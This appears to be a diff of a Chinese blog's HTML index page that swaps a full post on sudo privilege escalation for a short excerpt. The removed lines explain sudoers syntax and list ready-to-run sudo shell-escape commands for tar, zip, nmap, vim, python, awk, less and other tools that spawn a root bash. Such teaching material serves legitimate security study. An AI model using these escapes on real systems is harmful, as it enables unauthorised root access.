@@ -449,51 +449,12 @@
 
       
         
-          
-            <a id="more"></a>
-<h4 id="sudo是什么？"><a href="#sudo是什么？" class="headerlink" title="sudo是什么？"></a>sudo是什么？</h4><p>给普通用户某个命令有root权限，并不需要给root密码，毕竟知道root密码的人越多越不安全。<br>普遍的做法就是利用sudo （Substitute User and Do 的简写）给其临时授权,临时让其以root 权限运行某个程序。 </p>
-<h4 id="sudo的执行原理"><a href="#sudo的执行原理" class="headerlink" title="sudo的执行原理"></a>sudo的执行原理</h4><p>普通用户执行命令 -&gt; 检查<code>/var/db/sudo/</code>目录下是否有用户时间戳 -&gt; 检查<code>/etc/sudoers</code>配置文件，用户是否有sudo权限 -&gt; 执行sudo命令并反回结果 -&gt; 退出sudo返回普通用户shell环境。</p>
-<p>其中步骤2检查：时间戳默认从上一次执行sudo命令5分钟后过期。</p>
-<p><code>/etc/sudoers</code> 或者使用<code>visudo</code>命令进行编辑。</p>
-<p>文件语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL) ALL</span><br></pre></td></tr></table></figure>
-<ul>
-<li>root表示用户名</li>
-<li>第一个 ALL 指示允许从任何终端、机器访问sudo</li>
-<li>第二个 (ALL)指示sudo命令被允许以任何用户身份执行</li>
-<li>第三个 ALL 表示所有命令都可以作为root执行</li>
-</ul>
-<p>使用<code>sudo -l</code>查看当前权限。</p>
-<h4 id="zip、tar、strace、nmap、more、git、ftp、vim、passwd"><a href="#zip、tar、strace、nmap、more、git、ftp、vim、passwd" class="headerlink" title="zip、tar、strace、nmap、more、git、ftp、vim、passwd"></a>zip、tar、strace、nmap、more、git、ftp、vim、passwd</h4><p>zip:<br><code>sudo zip /tmp/tmp.zip /tmp/ -T --unzip-command=&quot;sh -c /bin/bash&quot;</code></p>
-<ul>
-<li>-T 表示测试test.zip的完整性</li>
-<li>–unzip-command 与-T 一起使用，可以指定自定义命令用于解压test.zip</li>
-</ul>
-<p>tar:<br><code>sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/bash</code></p>
-<ul>
-<li>–checkpoint-action选项是提权点,可以自定义需要执行的动作</li>
-</ul>
-<p>strace:<br><code>sudo strace -o /dev/null /bin/bash</code></p>
-<p>nmap:<br><code>低版本的nmap3.x 有interactive模式，且设置了suid，这个时候可以进入交互模式 执行!sh 命令即可轻松完成提权。</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"os.execute('/bin/bash')"</span> &gt; /tmp/shell.nse</span><br><span class="line">sudo nmap --script=/tmp/shell.nse</span><br></pre></td></tr></table></figure>
-<p>more:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo more /etc/hosts</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
-<p>git:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">help</span> status</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
-<p>ftp:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ftp</span><br><span class="line">ftp&gt; !/bin/bash</span><br></pre></td></tr></table></figure>
-<p>vim:<br><code>sudo vim -c &#39;!bash&#39;</code></p>
-<h4 id="perl、python、less、awk、man、vi"><a href="#perl、python、less、awk、man、vi" class="headerlink" title="perl、python、less、awk、man、vi"></a>perl、python、less、awk、man、vi</h4><p>perl:<br><code>sudo perl -e &#39;exec &quot;/bin/bash&quot;;&#39;</code></p>
-<p>python:<br><code>sudo python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p>less:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line">v</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
-<p>awk:<br><code>sudo awk &#39;BEGIN {system(&quot;/bin/bash&quot;)}&#39;</code></p>
-<p>man:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
-<p>vi:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi</span><br><span class="line">:!bash</span><br></pre></td></tr></table></figure>
-
-          
+          <h4 id="sudo是什么？"><a href="#sudo是什么？" class="headerlink" title="sudo是什么？"></a>sudo是什么？</h4><p>给普通用户某个命令有root权限，并不需要给root密码，毕竟知道root密码的人越多越不安全。<br>普遍的做法就是利用sudo （Substitute User and Do 的简写）给其临时授权,临时让其以root 权限运行某个程序。 </p>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2019/07/24/sudo提权/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
